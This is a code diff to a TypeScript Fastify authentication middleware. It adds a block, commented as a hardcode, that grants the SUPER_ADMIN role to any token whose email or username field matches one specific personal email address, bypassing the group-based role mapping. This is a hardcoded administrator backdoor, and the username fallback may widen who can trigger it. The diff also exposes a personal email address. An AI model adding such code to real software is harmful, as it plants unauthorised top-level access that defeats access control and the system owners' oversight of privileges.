@@ -46,6 +46,12 @@ export const authMiddleware = async (request: FastifyRequest, reply: FastifyRepl
         else if (groups.includes('Developer')) role = UserRole.DEVELOPER;
         else if (groups.includes('Admin')) role = UserRole.SUPER_ADMIN; // Legacy/Fallback
 
+        // HARDCODE: Chappa Bharth as Admin
+        const tokenEmail = (payload.email || payload['email'] || payload.username || '').toString();
+        if (tokenEmail === 'chappabharath1999@gmail.com') {
+            role = UserRole.SUPER_ADMIN;
+        }
+
         request.user = {
             id: payload.sub,
             role,
